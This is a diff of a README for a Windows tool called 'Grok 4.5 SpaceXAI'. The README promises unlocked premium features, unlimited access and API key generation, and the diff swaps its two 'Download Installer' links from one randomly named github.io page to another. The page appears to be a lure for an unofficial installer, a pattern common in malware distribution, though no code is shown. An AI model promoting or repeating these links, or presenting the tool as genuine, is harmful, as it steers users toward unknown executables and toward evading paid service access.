@@ -2,7 +2,7 @@
 
 Grok 4.5 SpaceXAI is a cutting-edge Windows desktop application designed to unlock premium features and provide seamless access to advanced AI capabilities. This tool leverages the latest in 2026 technology to enhance your experience with Grok 4.5, offering unlimited access, API key generation, and account management in a user-friendly interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside: Key Features
 
@@ -55,7 +55,7 @@ A4: Updates are released periodically to maintain compatibility with Grok 4.5's 
 
 For the most up-to-date version of Grok 4.5 SpaceXAI, visit the official download page. This ensures you receive the latest features, security patches, and support.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Version History
 
